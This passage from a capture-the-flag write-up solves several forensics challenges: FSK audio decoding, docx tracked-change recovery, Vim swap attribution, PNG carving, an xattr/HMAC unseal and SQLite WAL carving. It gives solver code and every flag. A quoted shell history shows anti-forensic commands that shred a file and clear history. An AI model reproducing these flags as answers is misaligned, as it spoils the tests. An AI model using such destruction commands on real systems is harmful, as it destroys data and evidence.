tar xzf $B/3fd0c5556f5ebeeeb6ab2f6a9c8b8957d0b5d671e8d31544e66ae46a3d238b9b -C /tmp etc/cascade/.sealed_marker
# the sealed credential from the historian.key.sealed layer (L3, 928d)
tar xzf $B/928dc5c296b6a92bf42eb017059869949605ef304391ed9a9a9f1bf08ab5fcea -C /tmp etc/cascade/historian.key.sealed

python3 -I - << 'EOF'
import hmac,hashlib
seal=bytes.fromhex("ddc9bfb15738fbd10757eb936a593931")          # Labels['build.seal']
marker=open('/tmp/etc/cascade/.sealed_marker','rb').read()       # original, from the surviving lower layer
sealed=open('/tmp/etc/cascade/historian.key.sealed','rb').read()
dg=hmac.new(seal,marker,hashlib.sha256).digest()                # 32-byte keystream unit
ks=(dg*(len(sealed)//len(dg)+1))[:len(sealed)]
print(bytes(a^b for a,b in zip(sealed,ks)).decode())
EOF
# CSCTF{layer_remembers_93e33478c}
```

The original marker (`f4901a8d…`) unseals to the flag; feeding the `site-rev-b` decoy (`f5d8040f…`) yields pure noise — confirming the seal was keyed on the layer-3 marker, not the top-of-stack one.

#### Takeaways

- **Layers are append-only; a delete is just a whiteout.** `RUN rm` writes a `.wh.` marker in a new layer — the original bytes stay in the layer that created them. Extract layers individually instead of flattening the image.
- **Config history is a confession.** The OCI config's `history[].created_by`/`comment` spelled out the build order *and* the exact seal algorithm; no guessing required.
- **Mind the temporal anchor.** The seal keyed on the marker “at the end of *this* layer” — so the correct marker is the one from before the overwrite, not the latest one on disk.
- **Everything as data.** `unzip`, `jq`, `tar t/x`, and an HMAC/XOR — no container runtime, no root, nothing executed.

**Flag:** `CSCTF{layer_remembers_93e33478c}`

---

### 25. Tone Burst

*Forensics · Easy · 120 pts*

**Flag:** `CSCTF{tone_burst_4481dda445a0a227c3a8eb90fda4fd92}`

#### Challenge

A field relay's outage-training archive holds a short audio test burst that carries the last recovered relay identifier; the text export is gone. Recover the identifier from the WAV — software-generated, no playback needed, analyze the waveform.

The file is 16-bit mono PCM at 8 kHz, ~9.2 s. It isn't speech or Morse: it's **binary FSK** (frequency-shift keying) — two tones that encode bits, framed like a simple data-link packet.

#### 1. See the two tones

**Screenshot 1:** format + a spectrogram showing two frequency lines and the preamble
```bash
cd ~/toneburst
soxi tone-burst.wav                       # 16-bit mono 8000 Hz, ~9.2s
sox tone-burst.wav -n spectrogram -o tone-burst.png   # view the image
```

The spectrogram shows energy only at **1000 Hz** and **2000 Hz**, starting with a rapidly alternating stretch (a `1010…` clock-sync **preamble**) and then slower, data-dependent runs. Two tones + preamble = binary FSK.

#### 2. Recover the symbol rate

Stepping the dominant frequency in 20 ms windows shows the preamble flips every 20 ms, so the symbol period is **20 ms = 50 baud**, with `2000 Hz = 1` and `1000 Hz = 0`.

**Screenshot 2:** dominant frequency per 20 ms window (first second)
```bash
cd ~/toneburst
python3 -I - << 'EOF'
import wave,numpy as np
w=wave.open('tone-burst.wav'); fr=w.getframerate()
x=np.frombuffer(w.readframes(w.getnframes()),dtype=np.int16).astype(float)
sym=int(0.02*fr)
for i in range(0,fr,sym):            # first ~1 s
    seg=x[i:i+sym]*np.hanning(sym)
    f=np.fft.rfftfreq(sym,1/fr); pk=f[np.abs(np.fft.rfft(seg)).argmax()]
    print(f"{i/fr:4.2f}s  {pk:5.0f} Hz")
EOF
```

#### 3. Demodulate to bits and read the frame

A Goertzel detector per 20 ms window gives the bitstream. After the `1010…` preamble the data is framed with **HDLC flag bytes `0x7E`** (`01111110`); the ASCII payload sits byte-aligned between the opening and closing flags.

**Screenshot 3:** full self-contained demodulator
![2026-11-08_024649.png](images/2026-11-08_024649.png)

![2026-11-08_024714.png](images/2026-11-08_024714.png)

```bash
cd ~/toneburst
cat > solve.py << 'EOF'
#!/usr/bin/env python3
# Tone Burst - demodulate binary FSK (1000/2000 Hz) and read the HDLC-framed ASCII payload.
import wave,numpy as np
w=wave.open('tone-burst.wav'); fr=w.getframerate()
x=np.frombuffer(w.readframes(w.getnframes()),dtype=np.int16).astype(float)

def goertzel(seg,f):                       # tone power at frequency f
    k=2*np.cos(2*np.pi*f/fr); s1=s2=0.0
    for v in seg: s0=v+k*s1-s2; s2=s1; s1=s0
    return s1*s1+s2*s2-k*s1*s2

sym=int(0.020*fr)                          # 20 ms/symbol = 50 baud
bits=''.join('1' if goertzel(x[i:i+sym],2000)>goertzel(x[i:i+sym],1000) else '0'
             for i in range(0,len(x)-sym,sym))          # 2000Hz=1, 1000Hz=0

flag='01111110'                            # 0x7E HDLC flag
bits=bits[bits.index(flag)+8:]             # skip preamble + opening flag
out=bytearray()
for j in range(0,len(bits)-7,8):
    byte=bits[j:j+8]
    if byte==flag: break                   # closing flag
    out.append(int(byte,2))
print(out.decode())
EOF
python3 -I solve.py
# CSCTF{tone_burst_4481dda445a0a227c3a8eb90fda4fd92}
```

Byte-aligning right after the opening `0x7E` yields `43 53 43 54 46 7B` = `CSCTF{`, and the frame reads out to the flag.

#### Takeaways

- **Two tones = FSK.** When a spectrogram shows exactly two frequencies, it's frequency-shift keying; map the lower/upper tone to 0/1.
- **Preamble gives you the clock.** The alternating `1010…` run sets the symbol rate — measure its flip period (20 ms → 50 baud) and sample at that cadence.
- **Goertzel beats a full FFT for two known tones.** It cheaply measures power at exactly 1000 and 2000 Hz per symbol window.
- **Respect the framing.** `0x7E` flags delimit the payload; anchor byte alignment on the flag rather than on the preamble, or every byte shifts by a bit.

**Flag:** `CSCTF{tone_burst_4481dda445a0a227c3a8eb90fda4fd92}`

---

### 26. Redline

*Forensics · Easy · 120 pts*

**Flag:** `CSCTF{redline_21ee9b19d342e06432165fb2b6f64e06}`

#### Challenge

During a grid-instability night, a cold-chain excursion directive (Depot 7, case Nightwatch) went out telling crews what to do with medicine that broke the cold chain. A crew lead kept their copy — and it reads wrong. The directive is a `.docx`; work out how the crews' version differs from what was approved, who changed it, and recover the **original** excursion authorization.

The whole case lives in the file's **tracked changes**: a `.docx` is a ZIP, and Word stores revisions as `<w:ins>` (insertions) and `<w:del>` (deletions) in `word/document.xml`, each stamped with `w:author`. The approved text was deleted and replaced, but the deletions are still in the file.

#### 1. Unpack the document

**Screenshot 1:** a .docx is a zip — unpack and list it
```bash
mkdir -p ~/redline && cd ~/redline
sha256sum CC-11_excursion_directive.docx
mkdir -p x && unzip -o CC-11_excursion_directive.docx -d x
ls -R x
```

#### 2. Who made the revisions?

**Screenshot 2:** every tracked change has one author
```bash
cd ~/redline/x
grep -o 'w:author="[^"]*"' word/document.xml | sort | uniq -c
```

Every revision is `w:author="s.kessler"`, dated `2026-10-07T02:41:00Z`. The document metadata separates author from editor:

```bash
xmllint --format docProps/core.xml
#   <dc:creator>A. Reyes</dc:creator>
#   <cp:lastModifiedBy>s.kessler</cp:lastModifiedBy>
```

So **A. Reyes** authored the approved directive; **s.kessler** edited it last. And `word/comments.xml` is a signed confession:

```bash
xmllint --format word/comments.xml
#   s.kessler: "Per tonight's dispatch throughput directive I am dropping the
#   quarantine hold - Depot 7 backlog is too high to sideline stock.
#   Re-issuing under a fresh authorization."
```

#### 3. Insertions vs deletions — the tamper

**Screenshot 3:** what was inserted (crews' version) vs deleted (approved)
```bash
cd ~/redline/x
# INSERTIONS - the version pushed to the crews
xmllint --format word/document.xml | grep -A3 '<w:ins '
# DELETIONS - the original approved text (recoverable)
xmllint --format word/document.xml | grep -A3 '<w:del '
```

The edits flip the directive's meaning:

|  | Approved (`<w:del>`) | Pushed to crews (`<w:ins>`) |
| --- | --- | --- |
| action | “MUST be **quarantined** and MUST NOT be redistributed” | “may be **returned to distribution** at depot-supervisor discretion” |
| wording | “temperature” / “30” | “thermal” / “90” |
| authorization | **the real flag** (below) | `CSCTF{dispatch_0f7c0c00aac69bbb86d6b96391f5d112}` (decoy) |

#### 4. Reconstruct the original authorization

The approved authorization was deleted as **three separate runs** (ids 107–109) so a careless read grabs only the first fragment:

```
<w:del id=107> CSCTF{redline_21ee9b19d
<w:del id=108> 342e06432165fb2b6f64e06}
<w:del id=109> .
```

Concatenating the deleted runs in order gives the original excursion authorization. The `dispatch_…` value that actually reached the crews is the decoy insertion.

#### Takeaways

- **Tracked changes are evidence, not just edits.** `<w:del>` keeps the original text inside the file — “deleted” in Word is still present in `document.xml`.
- **Author ≠ editor.** `dc:creator` (A. Reyes) vs `cp:lastModifiedBy` (s.kessler), plus the per-revision `w:author`, name who changed what.
- **Comments can hand you motive.** The tamperer explained the quarantine-hold removal in a Word comment.
- **Watch for split runs.** The real flag was fragmented across three deletion runs; reconstruct in id order rather than trusting the first match.

**Flag:** `CSCTF{redline_21ee9b19d342e06432165fb2b6f64e06}`

---

### 27. Last Buffer

*Forensics · Easy · 120 pts*

**Flag:** `CSCTF{last_buffer_4051c9f6b0d9622479785f613b063916}`

#### Challenge

An endpoint collector kept two Vim recovery files for the same incident note: a periodic snapshot and the one grabbed when the shell dropped. Both restore cleanly, but only one came from the shell that **died during the response window** — the other is an earlier drill revision. Recover both, decide which is which, and return the encoded read-back proof from the real one.

#### 1. Inventory

The handout has two swaps (`.swp` / `.swo` — the collector stripped the leading dot), the saved note, and three evidence logs: `shell-journal.jsonl`, `audit-timeline.jsonl`, `case-context.json`. `vim-swap-layout.md` documents the Vim 9 swap format: block zero begins `b0`, with page size at offset 12, **PID at offset 24**, user at 28, host at 68, original path at 108; data blocks hold NUL-terminated lines.

**Screenshot 1:** read the swap headers as data (no Vim, no recovery)
```bash
cd ~/lastbuffer
file incident-2026-10-07.md.sw*
for f in incident-2026-10-07.md.swp incident-2026-10-07.md.swo; do
  echo "== $f =="
  xxd -s 24 -l 4 "$f"      # PID (little-endian int32 at offset 24)
  strings -n 6 "$f" | grep -iE 'host|opnight|incident-2026'
done
```

#### 2. Which shell died?

The logs pin the fatal session precisely:

- `case-context.json`: crash window **02:19:30–02:20:00Z**, target tty **pts/4**.
- `shell-journal.jsonl`: PID **8124** edited on pts/7 and `command_complete` (clean) at 02:12:18; PID **8442** started vim on pts/4 at 02:18:04, then `session_disconnect / upstream-link-reset` at 02:19:46.
- `audit-timeline.jsonl`: `ANOM_ABEND` on PID **8442** (`SIGHUP`) at 02:19:46, followed by the `disconnect-capture` swap write.

So the shell that mattered is **PID 8442 on pts/4**. The swap header PID (offset 24) is the join key: `.swp` → 8442 (died), `.swo` → 8124 (the pts/7 drill).

**Decisive tie-break:** the dead swap's `base_file_sha256` is `01c2a034…bc849` — the exact hash the operator computed with `sha256sum` (PID 8460) on pts/4 at 02:18:31 in the journal. That binds the `.swp` to the session that died; the `.swo`'s hash (`a5bcac6d…`) never appears in the logs.

#### 3. Recover the note and decode the proof

**Screenshot 2:** full self-contained solver
```bash
cd ~/lastbuffer
cat > solve.py << 'EOF'
#!/usr/bin/env python3
# Last Buffer - identify which Vim swap came from the shell that died, decode its proof.
import base64,struct,re,json,glob

def swap_header(path):
    raw=open(path,'rb').read()
    assert raw[:5]==b'b0VIM', path+" not a Vim swap"
    return {
        'file':path,
        'pid':   struct.unpack_from('<i',raw,24)[0],   # PID at offset 24
        'mtime': struct.unpack_from('<i',raw,16)[0],   # mtime at offset 16
        'user':  raw[28:68].split(b'\x00')[0].decode(),
        'host':  raw[68:108].split(b'\x00')[0].decode(),
        'orig':  raw[108:].split(b'\x00')[0].decode(),
        'raw':   raw,
    }

def swap_text(raw):                                    # NUL-terminated lines in data pages
    out={}
    for c in re.split(rb'\x00', raw[4096:]):
        s=c.decode('latin1')
        if ':' in s and sum(32<=ch<127 for ch in c)==len(c) and len(c)>=4:
            k,_,v=s.partition(':'); out[k.strip()]=v.strip()
    return out

# 1. which PID died? the session that abended / disconnected in the crash window
ctx=json.load(open('case-context.json'))
audit=[json.loads(l) for l in open('audit-timeline.jsonl') if l.strip()]
dead_pid=next(e['pid'] for e in audit if e['event']=='ANOM_ABEND')
print(f"crash window {ctx['crash_window_start']}..{ctx['crash_window_end']} tty {ctx['target_tty']}; dead PID={dead_pid}")

# 2. match it to a swap file by header PID
swaps=[swap_header(p) for p in sorted(glob.glob('incident-2026-10-07.md.sw*'))]
for s in swaps:
    print(f"  {s['file']}: PID {s['pid']}  {'<-- DIED' if s['pid']==dead_pid else '(drill)'}")
dead=next(s for s in swaps if s['pid']==dead_pid)

# 3. recover its note fields and decode the base64url read-back proof
fields=swap_text(dead['raw'])
proof=base64.urlsafe_b64decode(fields['authorization_b64']+'=' *((-len(fields['authorization_b64']))%4))
print(f"\n{dead['file']}  status={fields.get('status')}  rev={fields.get('revision_id')}")
print("FLAG:",proof.decode())
EOF
python3 -I solve.py
```

The dead shell's note is revision `INC-4471/R18`, `status: UNSAVED-AT-DISCONNECT`, with `authorization_encoding: base64url`. Its `authorization_b64` decodes to the flag. (The drill's `.swo`, `R16-DRILL`, decodes to the decoy `retired-training-readback-16` — both “restore cleanly,” which is the trap.)

#### Native recovery (optional confirmation)

**Screenshot 3:** Vim recovers the same buffer
![2026-11-08_023234.png](images/2026-11-08_023234.png)

```bash
cd ~/lastbuffer
mkdir -p r && cp incident-2026-10-07.md.swp r/.incident-2026-10-07.md.swp
cp incident-2026-10-07.md r/ ; cd r
vim -Nu NONE -r incident-2026-10-07.md -c 'wq! recovered.txt'
grep authorization_b64 recovered.txt | awk '{print $2}' | tr '_-' '/+' | base64 -d
```

#### Takeaways

- **“Restores cleanly” says nothing about provenance.** Both swaps rebuild a valid buffer; only the metadata (header PID, recorded status, base-file hash) tells you which process wrote it.
- **The swap header is a forensic record.** Vim stamps the writing process's PID (offset 24) and mtime into block zero — read it as data to tie a swap to a specific shell.
- **Correlate, then tie-break.** The journal/audit name the dead PID; the `sha256sum` the operator ran on pts/4 matches only the dead swap's `base_file_sha256`, removing all doubt.
- **Mind the encoding.** The proof is `base64url` (`-_`, not `+/`) — decode it as such.

**Flag:** `CSCTF{last_buffer_4051c9f6b0d9622479785f613b063916}`

---

### 28. Flotsam

*Forensics · Easy · 120 pts*

**Flag:** `CSCTF{flotsam_0e91019a8e70267f550895930247d088}`

#### Challenge

The VDR (voyage data recorder) from MV Ortelia was read **chip-off** — a raw 35,840-byte byte dump with no filesystem, so files must be carved by hand. The bridge wrote a chart PNG of the last fix; recover it and read the key printed on it. The warning *“a file that opens is not the same as a file that is whole”* is the whole challenge: the PNG is fragmented and stored out of order, so a lazy carve produces a file that renders its top but is missing the bottom — where the key sits.

#### 1. Map the dump

**Screenshot 1:** locate the signatures
```bash
cd ~/flotsam
grep -abo $'\x89PNG' recorder-sectors.img     # 26624  (PNG header)
grep -abo 'IEND' recorder-sectors.img         # 24215  (IEND - BEFORE the header!)
grep -abo $'\xff\xd8\xff' recorder-sectors.img # 11264  (a JPEG decoy)
```

The PNG signature is at **26624**, but the only `IEND` is at **24215** — *before* the header. A PNG can't end before it begins, so the file is fragmented and the pieces are out of order on the flash. There's also a complete JPEG (`FFD8…FFD9`) sitting in the middle as a decoy.

#### 2. Why the naive carve is only “openable”

**Screenshot 2:** the IDAT chunk overruns EOF
```bash
cd ~/flotsam
python3 -I - << 'EOF'
import struct
img=open('recorder-sectors.img','rb').read()
P=img.index(b'\x89PNG\r\n\x1a\n')
w,h,bd,ct=struct.unpack('>IIBB',img[P+16:P+26])
idat_len=struct.unpack('>I',img[P+33:P+37])[0]
print('IHDR %dx%d colortype=%d'%(w,h,ct),'IDAT len=',idat_len,
      'data 26665..',26665+idat_len,'but EOF=',len(img))
EOF
```

IHDR says 760×520 RGB, and the single `IDAT` declares **22630** bytes starting at 26665 — which would end at 49295, way past the 35840-byte EOF. Carving “`‰PNG` → EOF” yields IHDR + only the first ~8 KB of IDAT: some viewers draw the top of the chart (progressive) but the bottom, with the key, is gone. It *opens*; it isn't *whole*.

#### 3. The four fragments

A region scan (maximal non-zero runs, minus the JPEG) shows the IDAT split into four pieces stored out of order, which sum to **exactly** 22630:

```
HEAD  26665..34816   8151   zlib stream start (78 9c) + first IDAT bytes
R1     1536..10752   9216   continuation
R3    17920..21504   3584   continuation
R4    22528..24207   1679   tail, ends exactly at the IDAT CRC (then IEND)
                    -----
                    22630   = declared IDAT length
```

(The IDAT CRC is the 4 bytes before the `IEND` length field, so the tail data ends at `iend-8`.)

#### 4. Order by zlib and rebuild a whole PNG

HEAD is first (it holds the `78 9c` zlib header) and R4 is last (it ends at the CRC); the two middle pieces are ordered by which permutation decompresses cleanly to `height×(1+width×3)` bytes.

**Screenshot 3:** full self-contained solver → chart_recovered.png
```bash
cd ~/flotsam
cat > solve.py << 'EOF'
#!/usr/bin/env python3
# Flotsam - reassemble a PNG fragmented across a raw chip-off dump and make it WHOLE.
import zlib,struct,binascii,itertools
img=open('recorder-sectors.img','rb').read()

# 1. PNG header -> geometry + the single IDAT chunk's declared length
P=img.index(b'\x89PNG\r\n\x1a\n')                       # 26624
ihdr=img[P+16:P+16+13]
w,h,bd,ct=struct.unpack('>IIBB',ihdr[:10])
idat_len=struct.unpack('>I',img[P+33:P+37])[0]         # 22630
idat_start=P+41                                         # 26665: zlib stream start (78 9c)
iend=img.index(b"IEND"); idat_end=iend-8               # skip IEND len field + IDAT CRC
print(f"IHDR {w}x{h} ct={ct}  IDAT={idat_len}  starts@{idat_start} ends@{idat_end}")

# 2. The four IDAT fragments, out of order around a JPEG decoy (offsets from the map):
HEAD = img[idat_start:34816]      # header piece: zlib start .. zero padding   (8151)
R1   = img[1536:10752]            # continuation 1                            (9216)
R3   = img[17920:21504]           # continuation 2                            (3584)
R4   = img[22528:idat_end]        # tail: ends exactly at the IDAT CRC        (1679)
mids = [R1,R3]
print("lens",[len(x) for x in (HEAD,R1,R3,R4)],"sum",len(HEAD)+len(R1)+len(R3)+len(R4))

# 3. HEAD first, R4 last; order the middle pieces by which one zlib-decompresses
ch={0:1,2:3,3:1,4:2,6:4}[ct]; need=h*(1+w*ch); good=None
for perm in itertools.permutations(mids):
    data=HEAD+b''.join(perm)+R4
    try:
        if len(zlib.decompress(data))==need: good=data; break
    except: pass
assert good and len(good)==idat_len, "no valid ordering"
print("reassembled whole IDAT:",len(good),"-> raw",need)

# 4. rebuild a valid PNG
def chunk(t,d): return struct.pack('>I',len(d))+t+d+struct.pack('>I',binascii.crc32(t+d)&0xffffffff)
open('chart_recovered.png','wb').write(
    b'\x89PNG\r\n\x1a\n'+chunk(b'IHDR',ihdr)+chunk(b'IDAT',good)+chunk(b'IEND',b''))
print("wrote chart_recovered.png - open it to read the recovery key")
EOF
python3 -I solve.py
xdg-open chart_recovered.png 2>/dev/null || eog chart_recovered.png
```

Only `HEAD + R1 + R3 + R4` decompresses — to exactly 1,186,120 bytes (520 rows × 2281) — so that ordering is provably correct, and the rebuilt PNG is genuinely whole. Opening it shows the full chart with the key on the bottom bar:

![flotsam_chart_recovered.svg](images/flotsam_chart_recovered.svg)

#### Takeaways

- **“Opens” ≠ “whole.”** A truncated PNG with a valid IHDR renders its top rows and looks fine; the missing tail is exactly where a challenge hides the payload. Always check that the IDAT's declared length is actually present.
- **Chunk lengths are your map.** The IDAT length field (22630) told us how many bytes to gather; the four fragments summing to it precisely is the confirmation the carve is complete.
- **Let the format validate the order.** Rather than guessing fragment order, only the permutation that zlib-decompresses to the exact raster size is right — the data checks itself.
- **Ignore the decoys.** The out-of-order `IEND` and the embedded JPEG are there to make a signature-only carver (binwalk/foremost) produce a plausible-but-broken file.

**Flag:** `CSCTF{flotsam_0e91019a8e70267f550895930247d088}`

---

### 29. The Capability Ghost

*Forensics · Easy · 120 pts*

**Flag:** `CSCTF{fg6_x7i9b6b3nn_bj7sj}`

#### Challenge

A build runner for rail-signaling software was hit, and responders kept two things: a filesystem archive (`runner-fs.tar.gz`, with stored PAX extended attributes) and the host's systemd journal (`runner.journal`). A recovery marker was *sealed* on the box and the original shredded. The rules are explicit: inspect the records **as data** — don't run the binaries, don't restore the capabilities, don't extract as root. The name is the whole misdirection: the eye-catching artifact is a set of file *capabilities*, but the marker is hiding in a different, far more boring extended attribute.

#### 1. Lay it out

**Screenshot 1:** verify and unpack
```bash
mkdir -p ~/capghost && cd ~/capghost
sha256sum capability-ghost.zip     # c53a83...c31ffe
unzip -o capability-ghost.zip
file *
```

Four files: the tarball, the journal, a README, and a checksum manifest. The README spells out the boundary and even hands us the safe journal reader: `journalctl --file=runner.journal -o json` needs no root.

#### 2. Read the archive metadata (the capability bait)

**Screenshot 2:** list the tree and spot stored xattrs (the `*` after the mode)
```bash
cd ~/capghost
tar --xattrs --xattrs-include='*' -tvf runner-fs.tar.gz
```

Three executables wear a `*`: `/usr/bin/ping`, `/usr/local/bin/hc-probe`, `/usr/local/bin/backup-sync`. Each carries a `security.capability` xattr — `cap_net_raw` on ping, `cap_dac_read_search` on hc-probe, `cap_net_bind_service` on backup-sync. Plausible, and completely beside the point: the briefing's "do not restore capabilities" is steering us away from these. The payload is a *different* xattr. Read them all as data, without extracting or applying anything:

**Screenshot 3:** dump every stored xattr straight from the PAX records
```bash
cd ~/capghost
cat > caps.py << 'EOF'
#!/usr/bin/env python3
# Read PAX xattrs from the archive as DATA (no extraction, no capability restore)
import gzip
tar=gzip.decompress(open('runner-fs.tar.gz','rb').read())
off=0
while off+512<=len(tar):
    h=tar[off:off+512]
    if h==b'\x00'*512: break
    name=h[0:100].split(b'\x00')[0].decode('latin1')
    size=int((h[124:136].rstrip(b'\x00 ') or b'0').decode(),8)
    typ=chr(h[156]); body=tar[off+512:off+512+size]
    if typ=='x':                       # PAX extended header -> parse records
        i=0
        while i<len(body):
            sp=body.index(b' ',i); ln=int(body[i:sp]); rec=body[sp+1:i+ln-1]
            k,_,v=rec.partition(b'=')
            if k.startswith(b'SCHILY.xattr.'):
                xn=k[len(b'SCHILY.xattr.'):].decode()
                pr=all(32<=c<127 for c in v)
                print(f"  xattr {xn} = {v.decode() if pr else v.hex()}")
            i+=ln
    elif typ=='0':
        print(f"[file] {name} ({size}b)")
    off+=512+((size+511)//512)*512
EOF
python3 -I caps.py
```

That surfaces the real lead on `hc-probe`:

```
[file] ./usr/local/bin/hc-probe (14472b)
  xattr security.capability = 0100000204000000000000000000000000000000   <- decoy
  xattr user.build_seal      = 509df6cd8e103fa5                          <- the key
```

`user.build_seal` is an 8-byte provenance tag — our seal key.

#### 3. Reconstruct the sealing workflow

**Screenshot 4:** read the shell history, the service unit, and the sealed blob (content to stdout, nothing applied)
```bash
cd ~/capghost
tar -xzf runner-fs.tar.gz -O ./root/.bash_history
tar -xzf runner-fs.tar.gz -O ./lib/systemd/system/hc-probe.service
tar -xzf runner-fs.tar.gz -O ./etc/solunet/signaling-cfg.sealed > sealed.bin
xxd sealed.bin
```

`.bash_history` tells the whole story:

```
setcap cap_dac_read_search+ep /usr/local/bin/hc-probe
TAG=$(head -c8 /dev/urandom | xxd -p)
setfattr -n user.build_seal -v "0x$TAG" /usr/local/bin/hc-probe
EPOCH=$(date +%s)
/usr/local/bin/hc-probe --seal "$TAG" "$EPOCH" /etc/solunet/signaling-cfg /etc/solunet/signaling-cfg.sealed
shred -u /etc/solunet/signaling-cfg
history -c
```

So the marker file was sealed with `TAG` (saved in `user.build_seal` — we have it) and an `EPOCH`, then the plaintext was shredded. The 27 sealed bytes are `b05507fb…997f`.

#### 4. Recover the cipher (static, no execution)

**Screenshot 5:** hc-probe documents its own scheme
```bash
cd ~/capghost
tar -xzf runner-fs.tar.gz -O ./usr/local/bin/hc-probe > hc-probe.bin
strings -a hc-probe.bin | grep -A12 -i 'sealing scheme'
```

The help text lays it bare — and plants the ghost:

```
key = HMAC-SHA256(key = raw_bytes(tag_hex), msg = ascii_decimal_string(seal_epoch))
out[i] = in[i] XOR key[i mod 32]
...seal_epoch is this probe run's seal timestamp (see this run's journal
entry's X_SEAL_EPOCH field - NOT the entry's realtime timestamp)
```

Symmetric repeating-key XOR against an HMAC-SHA256 keystream. We have the tag and the ciphertext; we need the epoch — and the binary warns us which field is the trap.

#### 5. The ghost — the right timestamp

**Screenshot 6:** pull X_SEAL_EPOCH from the journal (as data, no root)
```bash
cd ~/capghost
journalctl --file=runner.journal --no-pager -o json \
  | tr ',' '\n' | grep -iE 'X_SEAL_EPOCH|hc-probe|sealed result'
```

The hc-probe entry carries `X_SEAL_EPOCH = 1793294042`. The archive's own mtime on the sealed file is `1793296274` — about 37 minutes later. That gap *is* the capability ghost: the obvious timestamp (the file mtime / the journal realtime) is a decoy, and only the embedded `X_SEAL_EPOCH` key field unseals it.

#### 6. Unseal

**Screenshot 7:** HMAC keystream XOR → marker
![2026-11-08_020210.png](images/2026-11-08_020210.png)

```bash
cd ~/capghost
cat > unseal.py << 'EOF'
#!/usr/bin/env python3
import hmac,hashlib
sealed=open('sealed.bin','rb').read()            # the 27 sealed bytes
tag=bytes.fromhex("509df6cd8e103fa5")            # user.build_seal xattr on hc-probe
epoch=b"1793294042"                              # journal X_SEAL_EPOCH (NOT the mtime)
key=hmac.new(tag,epoch,hashlib.sha256).digest()  # 32-byte keystream
print(bytes(sealed[i]^key[i%32] for i in range(len(sealed))).decode())
EOF
python3 -I unseal.py
# CSCTF{fg6_x7i9b6b3nn_bj7sj}
```

The seal epoch yields clean ASCII; feeding the decoy mtime (`1793296274`) instead returns pure noise — a one-line confirmation that the `X_SEAL_EPOCH` field was the intended key all along.

#### Takeaways

- **The loud artifact is the misdirection.** File capabilities (`security.capability`) are what the challenge name screams about, but the secret rode in a humble `user.*` xattr. Always enumerate *all* extended attributes, not just the scary ones.
- **Inspect xattrs as data.** PAX `SCHILY.xattr.*` records can be read straight out of the tar stream — no extraction, no `setcap`, no root, exactly as the forensic boundary demanded.
- **A seal is only as hidden as its key material.** The key was split across three records — tag in an xattr, epoch in a journal field, algorithm in the binary's own help — and the journal's realtime stamp was dangled as a plausible-but-wrong epoch.
- **Read, don't run.** Everything came from `strings`, `tar -O`, a PAX parser, and `journalctl -o json`; the sealed executable was never executed.

**Flag:** `CSCTF{fg6_x7i9b6b3nn_bj7sj}`

---

### 30. Operation Dawn: The Medic's Phone

*Forensics · Medium · 350 pts*

**Flag:** `CSCTF{03_at_platform_two_6f57d7}`

#### The story

A medic handed over their phone before boarding. Signals had pushed the platform assignment through the courier app, then “withdrew” it — so the chat now just shows a polite *“this message was withdrawn”* notice. The twist the briefing hands you for free: withdrawing a message only changes what the app *shows*. On Android, a chat app keeps its messages in SQLite, and SQLite doesn't erase — it rewrites. The old text is almost always still sitting in the write-ahead log. So the whole job is: open the backup, find the courier app's database, and read the page the app thought it had thrown away.

#### Step 1 — turn the .ab into a tar you can browse

An Android `.ab` is just a 24-byte text header (`ANDROID BACKUP` / version / `1`=zlib-compressed / `none`=no password) followed by a zlib-compressed tar. Ours is version 5, compressed, unencrypted — so strip the header and inflate.

`head -n4 medic-phone.ab        # ANDROID BACKUP / 5 / 1 / none`
`python3 -c "import zlib;d=open('medic-phone.ab','rb').read();open('medic.tar','wb').write(zlib.decompress(d[24:]))"`
`tar -tvf medic.tar            # look for the courier app's db`
- The interesting app is `org.unit43.courier`, and it ships exactly what we hoped: `db/messages.db` **and** `db/messages.db-wal`.

#### Step 2 — extract, but DON'T open it with sqlite3

**The one mistake that ruins this challenge:** running `sqlite3 messages.db` (or anything that opens the DB) triggers a **checkpoint-on-close** that folds the WAL into the main file and **deletes the -wal** — taking the withdrawn message with it. Work on a copy and read the raw bytes. If you already nuked it, just re-extract from the tar.

`mkdir -p work && tar -xf medic.tar -C work`
`cd work/apps/org.unit43.courier/db && ls -l   # messages.db + messages.db-wal`
#### Step 3 — read the current chat (to see the decoy notice)

The message bodies aren't plain text: each row's `pb` column is a little protobuf, and the actual text is a **raw-deflate** blob inside field 5 (`0x2a`). Decompress every row and the chat reads like a normal shift log — ending with message **#14**: *“This message was withdrawn by the sender…”* That notice is already baked into both the DB and the WAL, so the real text has to come from an older WAL page.

`cat > read.py << 'EOF'`
`import sqlite3, zlib`
`def body(pb):`
    `i=0`
    `while i<len(pb):`
        `tag=pb[i]; i+=1; f=tag>>3; wt=tag&7`
        `if wt==0:`
            `while pb[i]&0x80: i+=1`
            `i+=1`
        `elif wt==2:`
            `ln=0; sh=0`
            `while pb[i]&0x80: ln|=(pb[i]&0x7f)<<sh; sh+=7; i+=1`
            `ln|=pb[i]<<sh; i+=1; data=pb[i:i+ln]; i+=ln`
            `if f==5:`
                `return zlib.decompress(data,-15).decode('utf8','replace')`
        `else: return None`
`c=sqlite3.connect('messages.db')   # read-only-ish copy; see warning above`
`for mid,snd,pb in c.execute('SELECT id,sender,pb FROM messages ORDER BY id'):`
    `print(mid,snd,repr(body(pb)))`
`EOF`
`cp messages.db _tmp.db && python3 read.py 2>/dev/null; python3 - <<'PY'`
`import os;os.replace('\_tmp.db','messages.db') if os.path.exists('\_tmp.db') else None`
`PY`
#### Step 4 — carve the withdrawn text out of the WAL

The original message #14 was overwritten, but its old page — with the old deflate blob — is still in `messages.db-wal`. Raw-deflate can start at any byte, so just try to inflate from every offset and keep whatever comes out as readable text.

`cat > carve.py << 'EOF'`
`import zlib`
`for fn in ['messages.db','messages.db-wal']:`
    `d=open(fn,'rb').read()`
    `for i in range(len(d)-3):`
        `try: out=zlib.decompressobj(-15).decompress(d[i:],8192)`
        `except Exception: continue`
        `if len(out)<14: continue`
        `t=out.decode('utf8','ignore')`
        `if 'CSCTF' in t or 'Assignment' in t or 'platform' in t.lower():`
            `print(f'[{fn}@{i}]', t.strip())`
`EOF`
`python3 carve.py`
![2026-11-07_212823.png](images/2026-11-07_212823.png)

![2026-11-07_212858.png](images/2026-11-07_212858.png)

- Out pops the real order, recovered from `messages.db-wal`: *“Movement order. Board the hospital train. Assignment follows: CSCTF{03_at_platform_two_6f57d7} Acknowledge on receipt and destroy this message.”*

#### Takeaways

- **“Withdrawn” is a UI lie.** Chat apps update a row; they don't shred it. The previous value survives in the WAL until a checkpoint rolls it in.
